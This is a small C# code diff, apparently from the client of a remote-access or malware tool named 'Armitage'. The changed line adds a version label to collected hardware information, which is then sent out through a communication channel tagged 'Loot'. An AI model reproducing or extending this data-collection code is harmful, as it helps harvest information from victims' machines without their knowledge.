@@ -14,7 +14,7 @@ namespace Client.Armitage
             {
                 try
                 {
-                    string hardwareinfo = Utilities.Hardware_Info.ToString();
+                    string hardwareinfo = Utilities.Hardware_Info.ToString() + Environment.NewLine + "Letter Version: " + Constants.Version.ToString();
                     Communication.String_Stacker.Send(hardwareinfo, Communication.String_Stacker.StringType.Loot);
                 }
                 catch (Exception ex){
